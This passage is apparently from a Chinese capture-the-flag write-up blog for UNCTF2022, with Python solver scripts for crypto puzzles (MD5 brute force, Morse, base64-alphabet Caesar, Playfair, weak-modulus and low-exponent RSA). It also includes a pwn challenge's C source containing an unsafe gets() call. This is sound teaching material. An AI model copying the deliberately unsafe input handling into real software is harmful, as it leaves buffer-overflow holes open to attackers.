class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The key is 8 bits&quot;</span>);<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个比上题还简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">code=<span class="hljs-string">&quot;HELLOCTF&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>	flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span> * <span class="hljs-built_in">ord</span>(i) - <span class="hljs-number">69</span>)<br><span class="hljs-built_in">print</span>(flag) <br></code></pre></td></tr></table></figure>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="welcomeUNCTF2022-云南警官学院"><a href="#welcomeUNCTF2022-云南警官学院" class="headerlink" title="welcomeUNCTF2022-云南警官学院"></a>welcomeUNCTF2022-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744914.png" srcset="/img/loading.gif" lazyload alt="image-20221119103016610"></p>
<p>差不多就是test your nc（我也只会这个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+17h] [ebp-11h]</span><br><br>  <span class="hljs-built_in">strcpy</span>(s2, <span class="hljs-string">&quot;UNCTF&amp;2022&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to UNCTF2022 Please enter the password:&quot;</span>);<br>  gets(&amp;s);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(&amp;s, s2) )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wrong!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>输入UNCTF&amp;2022即可得到flag</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744915.png" srcset="/img/loading.gif" lazyload alt="image-20221119104458140"></p>
<p>加密源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><br>flag=<span class="hljs-string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="hljs-string">&#x27;x&#x27;</span>.encode()).hexdigest()<br><span class="hljs-comment"># x不是一个字符是n个字符</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-keyword">as</span> file:<br>        file.write(md5(i.encode()).hexdigest()+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<p>直接用可见字符的md5逐个比对，爆破出来flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>	<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>		<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>			re=md5(<span class="hljs-built_in">chr</span>(i).encode()).hexdigest()<br>			<span class="hljs-keyword">if</span> line.strip() == re :<br>				result+=<span class="hljs-built_in">chr</span>(i)<br>				<span class="hljs-built_in">print</span>(result)<br>				<span class="hljs-keyword">break</span><br>f.close()<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744916.png" srcset="/img/loading.gif" lazyload alt="image-20221117201435030"></p>
<h2 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744917.png" srcset="/img/loading.gif" lazyload alt="image-20221119104521470"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">110</span>/<span class="hljs-number">01</span>/<span class="hljs-number">0101</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1101</span>/<span class="hljs-number">0000100</span>/<span class="hljs-number">0100</span>/<span class="hljs-number">11110</span>/<span class="hljs-number">111</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1111</span>/<span class="hljs-number">10000</span>/<span class="hljs-number">111</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">1000</span>/<span class="hljs-number">110</span>/<span class="hljs-number">111</span>/<span class="hljs-number">0</span>/<span class="hljs-number">110010</span>/<span class="hljs-number">00</span>/<span class="hljs-number">00000</span>/<span class="hljs-number">101</span>/<span class="hljs-number">111</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0000010</span><br></code></pre></td></tr></table></figure>

<p>转摩斯</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..-<span class="hljs-regexp">/-./</span>-.-.<span class="hljs-regexp">/-/</span>..-.<span class="hljs-regexp">/----.--/</span>-.--<span class="hljs-regexp">/....-/</span>...<span class="hljs-regexp">/..--.-/</span>-<span class="hljs-regexp">/..../</span>.----<span class="hljs-regexp">/.../</span>..--.-<span class="hljs-regexp">/.---/</span>..-<span class="hljs-regexp">/.../</span>-<span class="hljs-regexp">/..--.-/</span>--<span class="hljs-regexp">/-----/</span>.-.<span class="hljs-regexp">/.../</span>./-----.-<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">UNCTF<span class="hljs-built_in">%u</span>7bY4S_TH1S_JUST_M0RSE<span class="hljs-built_in">%u</span>7d<br>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;<br></code></pre></td></tr></table></figure>

<h2 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744918.png" srcset="/img/loading.gif" lazyload alt="image-20221119104544669"></p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">我把表换成了base64的表<br><br>B6vAy&#123;dhd_AOiZ_KiMyLYLU<span class="hljs-built_in">a_JlL</span>/HY&#125;<br></code></pre></td></tr></table></figure>

<p>换表了，奉上我写的垃圾脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">dic = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br>str1 = <span class="hljs-string">&quot;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">25</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&#125;&#123;_&quot;</span>:<br>            n = dic.find(s)<br>            s = dic[(n+key)%<span class="hljs-number">64</span>]<br>            flag+=s<br>        <span class="hljs-keyword">else</span>:<br>            flag+=s<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;UNCTF&quot;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;key=%d&quot;</span>%key, end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    flag=<span class="hljs-string">&quot;&quot;</span><br><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744919.png" srcset="/img/loading.gif" lazyload alt="image-20221117202039265"></p>
<h2 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744920.png" srcset="/img/loading.gif" lazyload alt="image-20221119104558831"></p>
<p>找规律出的。。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">key</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;PLAY&quot;</span><br>OTUBM&#123;BCQ_SPH_WOQA_UAYFMKLWS&#125;<br></code></pre></td></tr></table></figure>

<p>给了一个例子：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">ABCDEFGHIKLMNOPQRSTUVWXYZ</span><br><span class="hljs-variable">key</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;ABCD&quot;</span><br><span class="hljs-variable">table</span><span class="hljs-operator">=</span><br><span class="hljs-punctuation">[</span><br>    <span class="hljs-built_in">E</span><span class="hljs-operator">,</span><span class="hljs-variable">F</span><span class="hljs-operator">,</span><span class="hljs-variable">G</span><span class="hljs-operator">,</span><span class="hljs-variable">H</span><span class="hljs-operator">,</span><span class="hljs-built_in">I</span><span class="hljs-operator">,</span><br>    <span class="hljs-built_in">K</span><span class="hljs-operator">,</span><span class="hljs-variable">L</span><span class="hljs-operator">,</span><span class="hljs-variable">M</span><span class="hljs-operator">,</span><span class="hljs-built_in">N</span><span class="hljs-operator">,</span><span class="hljs-built_in">O</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">P</span><span class="hljs-operator">,</span><span class="hljs-variable">Q</span><span class="hljs-operator">,</span><span class="hljs-variable">R</span><span class="hljs-operator">,</span><span class="hljs-variable">S</span><span class="hljs-operator">,</span><span class="hljs-variable">T</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">U</span><span class="hljs-operator">,</span><span class="hljs-variable">V</span><span class="hljs-operator">,</span><span class="hljs-variable">W</span><span class="hljs-operator">,</span><span class="hljs-variable">X</span><span class="hljs-operator">,</span><span class="hljs-variable">Y</span><span class="hljs-operator">,</span><br>    <span class="hljs-variable">Z</span><span class="hljs-operator">,</span><span class="hljs-variable">A</span><span class="hljs-operator">,</span><span class="hljs-variable">B</span><span class="hljs-operator">,</span><span class="hljs-built_in">C</span><span class="hljs-operator">,</span><span class="hljs-built_in">D</span><br><span class="hljs-punctuation">]</span><br>明文<span class="hljs-operator">=</span><span class="hljs-type">THE_CODE</span><br>整理为：<span class="hljs-variable">TH</span> <span class="hljs-variable">EC</span> <span class="hljs-variable">OD</span> <span class="hljs-variable">EX</span><br>密文为：<span class="hljs-variable">IS</span> <span class="hljs-variable">ZH</span> <span class="hljs-variable">TI</span> <span class="hljs-variable">UH</span><br>整理为：<span class="hljs-type">ISZ_HTIU</span><br><br>密文：<span class="hljs-type">ISZ_HTIUH</span><br>整理为：<span class="hljs-variable">IS</span> <span class="hljs-variable">ZH</span> <span class="hljs-variable">TI</span> <span class="hljs-variable">UH</span><br>明文为：<span class="hljs-variable">TH</span> <span class="hljs-variable">EC</span> <span class="hljs-variable">DO</span> <span class="hljs-variable">EX</span><br>整理为：<span class="hljs-type">THE_CODE</span><br></code></pre></td></tr></table></figure>

<p>可以找到规律，交叉的字符就选对位（按顺序），左右并排的就往左顺移一位，上下并列的就往上顺移一位</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">OTUBM</span><span class="hljs-punctuation">&#123;</span><span class="hljs-type">BCQ_SPH</span><span class="hljs-type">_WOQA</span><span class="hljs-type">_UAYFMKLWS</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-variable">table</span><span class="hljs-operator">=</span><br><span class="hljs-punctuation">[</span><br>	<span class="hljs-variable">B</span><span class="hljs-operator">,</span><span class="hljs-built_in">C</span><span class="hljs-operator">,</span><span class="hljs-built_in">D</span><span class="hljs-operator">,</span><span class="hljs-built_in">E</span><span class="hljs-operator">,</span><span class="hljs-variable">F</span><span class="hljs-operator">,</span><br>	<span class="hljs-variable">G</span><span class="hljs-operator">,</span><span class="hljs-variable">H</span><span class="hljs-operator">,</span><span class="hljs-built_in">I</span><span class="hljs-operator">,</span><span class="hljs-built_in">K</span><span class="hljs-operator">,</span><span class="hljs-variable">M</span><span class="hljs-operator">,</span><br>	<span class="hljs-built_in">N</span><span class="hljs-operator">,</span><span class="hljs-built_in">O</span><span class="hljs-operator">,</span><span class="hljs-variable">Q</span><span class="hljs-operator">,</span><span class="hljs-variable">R</span><span class="hljs-operator">,</span><span class="hljs-variable">S</span><span class="hljs-operator">,</span><br>	<span class="hljs-variable">T</span><span class="hljs-operator">,</span><span class="hljs-variable">U</span><span class="hljs-operator">,</span><span class="hljs-variable">V</span><span class="hljs-operator">,</span><span class="hljs-variable">W</span><span class="hljs-operator">,</span><span class="hljs-variable">X</span><span class="hljs-operator">,</span><br>	<span class="hljs-variable">Z</span><span class="hljs-operator">,</span><span class="hljs-variable">P</span><span class="hljs-operator">,</span><span class="hljs-variable">L</span><span class="hljs-operator">,</span><span class="hljs-variable">A</span><span class="hljs-operator">,</span><span class="hljs-variable">Y</span><br><span class="hljs-punctuation">]</span><br><br><span class="hljs-variable">OT</span>  <span class="hljs-variable">UB</span>  <span class="hljs-variable">MB</span>  <span class="hljs-variable">CQ</span>  <span class="hljs-variable">SP</span>  <span class="hljs-variable">HW</span>  <span class="hljs-variable">OQ</span>  <span class="hljs-variable">AU</span>  <span class="hljs-variable">AY</span>  <span class="hljs-variable">FM</span>  <span class="hljs-variable">KL</span>  <span class="hljs-variable">WS</span> <br><br><span class="hljs-variable">UN</span> <span class="hljs-variable">CT</span>  <span class="hljs-variable">FG</span>  <span class="hljs-variable">OD</span>  <span class="hljs-variable">YO</span>  <span class="hljs-variable">UK</span>  <span class="hljs-variable">NO</span>  <span class="hljs-variable">WP</span>  <span class="hljs-variable">LA</span>  <span class="hljs-variable">YF</span>  <span class="hljs-variable">AI</span>  <span class="hljs-variable">RE</span><br><br><span class="hljs-variable">UNCTF</span><span class="hljs-punctuation">&#123;</span><span class="hljs-type">GOD_YOU</span><span class="hljs-type">_KNOW</span><span class="hljs-type">_PLAYFAIR</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>后面去掉一个E是我试出来的。</p>
<h2 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744921.png" srcset="/img/loading.gif" lazyload alt="image-20221119104635126"></p>
<p>很久没看RSA了</p>
<p>ezRSA.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><br>p=libnum.generate_prime(<span class="hljs-number">256</span>)<br>e=<span class="hljs-number">65537</span><br>m=flag<br><br>m=libnum.s2n(m)<br>n=p**<span class="hljs-number">4</span><br>phi_n=p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span><span class="hljs-comment">#p=89065756791595323358603857939783936930073695697065732353414009005162022399741</span><br>d=libnum.invmod(e,phi_n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-number">62927872600012424</span> <span class="hljs-number">750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span><br><span class="hljs-number">65537</span> <br><span class="hljs-number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span><br></code></pre></td></tr></table></figure>

<p>phi_n给了，并且n能分解所以能直接秒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> libnum<br><br><br>p = <span class="hljs-number">89065756791595323358603857939783936930073695697065732353414009005162022399741</span><br>q =(p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span>)//(p-<span class="hljs-number">1</span>)<br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span><br><span class="hljs-comment"># n = 73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br><br>n=<span class="hljs-number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span><br>d = gmpy2.invert(e, p**<span class="hljs-number">4</span>-p**<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>, d)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744922.png" srcset="/img/loading.gif" lazyload alt="image-20221117202656884"></p>
<h2 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744923.png" srcset="/img/loading.gif" lazyload alt="image-20221119104645190"></p>
<p>babyRSA.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br>flag=<span class="hljs-string">&quot;UNCTF&#123;*************************&#125;&quot;</span> <br>m=libnum.s2n(flag)<br>p=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>q=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>n=p*q<br>e=<span class="hljs-number">6</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>M=((m&gt;&gt;<span class="hljs-number">60</span>)&lt;&lt;<span class="hljs-number">60</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;</span>,M) <br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span><br><span class="hljs-string">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span><br><span class="hljs-string">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>e特别小，想到有一个低加密指数攻击，直接套脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-comment">## -*- coding: utf-8 -*-#</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">6</span><br>n=<span class="hljs-number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span><br>c=<span class="hljs-number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c+k*n,e)  <br>    <span class="hljs-keyword">if</span>(res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))) <br>        <span class="hljs-keyword">break</span><br>    k=k+<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744924.png" srcset="/img/loading.gif" lazyload alt="image-20221117203048354"></p>
<h2 id="今晚吃什么-金陵科技学院"><a href="#今晚吃什么-金陵科技学院" class="headerlink" title="今晚吃什么-金陵科技学院"></a>今晚吃什么-金陵科技学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744925.png" srcset="/img/loading.gif" lazyload alt="image-20221119104703246"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">10000</span>  <span class="hljs-number">00000</span>  <span 